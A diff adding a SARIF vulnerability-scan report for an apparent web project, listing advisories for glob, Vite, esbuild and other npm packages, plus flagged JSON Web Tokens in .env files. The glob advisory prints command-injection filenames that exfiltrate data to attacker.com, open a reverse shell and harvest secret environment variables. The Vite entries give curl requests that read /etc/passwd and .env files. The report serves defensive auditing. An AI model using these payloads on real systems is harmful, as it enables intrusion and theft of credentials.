@@ -1,0 +1,558 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "SecureMCP",
+          "version": "1.0.2",
+          "informationUri": "https://github.com/traceforce/SecureMCP",
+          "rules": [
+            {
+              "id": "GHSA-jqfw-vq24-v9c3",
+              "shortDescription": {
+                "text": "Vite's `server.fs` settings were not applied to HTML files"
+              }
+            },
+            {
+              "id": "GHSA-v6h2-p8h4-qcjw",
+              "shortDescription": {
+                "text": "brace-expansion Regular Expression Denial of Service vulnerability"
+              }
+            },
+            {
+              "id": "GHSA-mwcw-c2x4-8c55",
+              "shortDescription": {
+                "text": "Predictable results in nanoid generation when given non-integer values"
+              }
+            },
+            {
+              "id": "GHSA-356w-63v5-8wf4",
+              "shortDescription": {
+                "text": "Vite has an `server.fs.deny` bypass with an invalid `request-target`"
+              }
+            },
+            {
+              "id": "GHSA-4r4m-qw57-chr8",
+              "shortDescription": {
+                "text": "Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query"
+              }
+            },
+            {
+              "id": "GHSA-g4jq-h2w9-997c",
+              "shortDescription": {
+                "text": "Vite middleware may serve files starting with the same name with the public directory"
+              }
+            },
+            {
+              "id": "GHSA-xcj6-pq6g-qj4x",
+              "shortDescription": {
+                "text": "Vite allows server.fs.deny to be bypassed with .svg or relative paths"
+              }
+            },
+            {
+              "id": "GHSA-968p-4wvh-cqc8",
+              "shortDescription": {
+                "text": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups"
+              }
+            },
+            {
+              "id": "GHSA-xffm-g5w8-qvg7",
+              "shortDescription": {
+                "text": "@eslint/plugin-kit is vulnerable to Regular Expression Denial of Service attacks through ConfigCommentParser"
+              }
+            },
+            {
+              "id": "GHSA-5j98-mcp5-4vw2",
+              "shortDescription": {
+                "text": "glob CLI: Command injection via -c/--cmd executes matches with shell:true"
+              }
+            },
+            {
+              "id": "GHSA-93m4-6634-74q7",
+              "shortDescription": {
+                "text": "vite allows server.fs.deny bypass via backslash on Windows"
+              }
+            },
+            {
+              "id": "GHSA-vg6x-rcgg-rjx6",
+              "shortDescription": {
+                "text": "Websites were able to send any requests to the development server and read the response in vite"
+              }
+            },
+            {
+              "id": "GHSA-67mh-4wv8-2f99",
+              "shortDescription": {
+                "text": "esbuild enables any website to send any requests to the development server and read the response"
+              }
+            },
+            {
+              "id": "GHSA-mh29-5h37-fv8m",
+              "shortDescription": {
+                "text": "js-yaml has prototype pollution in merge (\u003c\u003c)"
+              }
+            },
+            {
+              "id": "GHSA-859w-5945-r5v3",
+              "shortDescription": {
+                "text": "Vite's server.fs.deny bypassed with /. for files under project root"
+              }
+            },
+            {
+              "id": "GHSA-x574-m823-4x7w",
+              "shortDescription": {
+                "text": "Vite bypasses server.fs.deny when using ?raw??"
+              }
+            },
+            {
+              "id": "jwt",
+              "shortDescription": {
+                "text": "Uncovered a JSON Web Token, which may lead to unauthorized access to web applications and sensitive user data."
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "GHSA-5j98-mcp5-4vw2",
+          "level": "error",
+          "message": {
+            "text": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c \u003ccommand\u003e \u003cpatterns\u003e` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () =\u003e foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c \u003ccommand\u003e \u003cpattern\u003e` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `\u0026`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory \u0026\u0026 cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)\ntouch '$(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "11.1.0",
+            "package": "glob",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "10.4.5"
+          }
+        },
+        {
+          "ruleId": "jwt",
+          "level": "error",
+          "message": {
+            "text": "Uncovered a JSON Web Token, which may lead to unauthorized access to web applications and sensitive user data."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/.env"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "properties": {
+            "tool": "gitleaks",
+            "type": "SECRETS"
+          }
+        },
+        {
+          "ruleId": "jwt",
+          "level": "error",
+          "message": {
+            "text": "Uncovered a JSON Web Token, which may lead to unauthorized access to web applications and sensitive user data."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/.env.example"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "properties": {
+            "tool": "gitleaks",
+            "type": "SECRETS"
+          }
+        },
+        {
+          "ruleId": "GHSA-356w-63v5-8wf4",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\nThe contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun.\n\n### Impact\nOnly apps with the following conditions are affected.\n\n- explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun)\n\n### Details\n\n[HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)).\n\nOn Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won't contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check.\n\nOn Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. \n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\nsend request to read `/etc/passwd`\n```\ncurl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "6.2.6",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-859w-5945-r5v3",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\nThe contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\nOnly files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed.\n\n- Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env`\n- Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*`\n\n### Details\n[`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns).\nThese patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`).\n\n### PoC\n```\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" \u003e .env\nnpm install\nnpm run dev\ncurl --request-target /.env/. http://localhost:5173\n```\n\n![image](https://github.com/user-attachments/assets/822f4416-aa42-461f-8c95-a88d155e674b)\n![image](https://github.com/user-attachments/assets/42902144-863a-4afb-ac5b-fc16effa37cc)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "6.3.4",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-xcj6-pq6g-qj4x",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n#### `.svg`\n\nRequests ending with `.svg` are loaded at this line.\nhttps://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\nBy adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.\n\nThis bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.\n\n#### relative paths\n\nThe check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).\n\n### PoC\n\n```bash\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\n\nsend request to read `etc/passwd`\n\n```bash\ncurl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n```\n\n```bash\ncurl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import\u0026?raw'\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "6.2.5",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-mh29-5h37-fv8m",
+          "level": "warning",
+          "message": {
+            "text": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "4.1.1",
+            "package": "js-yaml",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "4.1.0"
+          }
+        },
+        {
+          "ruleId": "GHSA-mwcw-c2x4-8c55",
+          "level": "warning",
+          "message": {
+            "text": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "5.0.9",
+            "package": "nanoid",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "3.3.7"
+          }
+        },
+        {
+          "ruleId": "GHSA-968p-4wvh-cqc8",
+          "level": "warning",
+          "message": {
+            "text": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$\u003c` if it's then not followed by `\u003e` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "7.26.10",
+            "package": "@babel/runtime",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "7.25.9"
+          }
+        },
+        {
+          "ruleId": "GHSA-4r4m-qw57-chr8",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n- base64 encoded content of non-allowed files is exposed using `?inline\u0026import` (originally reported as `?import\u0026?inline=1.wasm?init`)\n- content of non-allowed files is exposed using `?raw?import`\n\n`/@fs/` isn't needed to reproduce the issue for files inside the project root.\n\n### PoC\n\nOriginal report (check details above for simplified cases):\n\nThe ?import\u0026?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice\n```\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n```\n\nExample full URL `http://localhost:5173/@fs/C:/windows/win.ini?import\u0026?inline=1.wasm?init`"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "6.2.4",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-67mh-4wv8-2f99",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e =\u003e console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r =\u003e r.text()).then(content =\u003e console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "0.25.0",
+            "package": "esbuild",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "0.21.5"
+          }
+        },
+        {
+          "ruleId": "GHSA-93m4-6634-74q7",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" \u003e .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n\u003cimg width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" /\u003e"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "7.1.11",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-x574-m823-4x7w",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import\u0026raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" \u003e /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    \u003cbody\u003e\n      \u003ch1\u003e403 Restricted\u003c/h1\u003e\n      \u003cp\u003eThe request url \u0026quot;/tmp/secret.txt\u0026quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import\u0026raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/Users/xiahua/src/traceforce-ui/package-lock.json"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "fixed": "6.2.3",
+            "package": "vite",
+            "tool": "osv",
+            "type": "SCA",
+            "version": "5.4.10"
+          }
+        },
+        {
+          "ruleId": "GHSA-vg6x-rcgg-rjx6",
+          "level": "warning",
+          "message": {
+            "text": "### Summary\nVite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.\n\n\u003e [!WARNING]\n\u003e This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.\n\n### Upgrade Path\nUsers that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.\n\n- Using the backend integration feature\n- Using a reverse proxy in front of Vite\n- Accessing the development server via a domain other than `localhost` or `*.localhost`\n- Using a plugin / framework that connects to the WebSocket server on their own from the browser\n\n#### Using the backend integration feature\nIf you are using the backend integration feature and not setting [`server.origin`](https://vite.dev/config/server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https://github.com/expressjs/cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.\n\n#### Using a reverse proxy in front of Vite\nIf you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http://vite:5173`, you need to add `vite` to the `server.allowedHosts` option.\n\n#### Accessing the development server via a domain other than `localhost` or `*.localhost`\nYou need to add the hostname to the new [`server.allowedHosts`](https://vite.dev/config/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http://foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.\n\n#### Using a plugin / framework that connects to the WebSocket server on their own from the browser\nIf you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.\n\nIn that case, you can either:\n\n- fix the plugin / framework code to the make it compatible with the new version of Vite\n- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite\n  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.\n\n### Mitigation without upgrading Vite\n#### [1]: Permissive default CORS settings\nSet `server.cors` to `false` or limit `server.cors.origin` to trusted origins.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nThere aren't any mitigations for this.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUse Chrome 94+ or use HTTPS for the development server.\n\n### Details\n\nThere are three causes that allowed malicious websites to send any requests to the development server:\n\n#### [1]: Permissive default CORS settings\n\nVite sets the [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) header depending on [`server.cors`](https://vite.dev/config/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker sends a `fetch('http://127.0.0.1:5173/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n4. The attacker gets the content of `http://127.0.0.1:5173/main.js`.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n\nVite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker runs `new WebSocket('http://127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.\n4. The user edits some files.\n5. Vite sends some HMR messages over WebSocket.\n6. The attacker gets the content of the HMR messages.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\n\nUnless [`server.https`](https://vite.dev/config/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.\n\n1. The attacker serves a malicious web page that is served on **HTTP** (`http://malicious.example.com:5173`) (HTTPS won't work).\n2. The user accesses the malicious web page.\n3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).\n4. The attacker sends a `fetch('/main.js')` request by JS in that malicious web page.\n5. The attacker gets the content of `http://127.0.0.1:5173/main.js` bypassing the same origin policy.\n\n### Impact\n#### 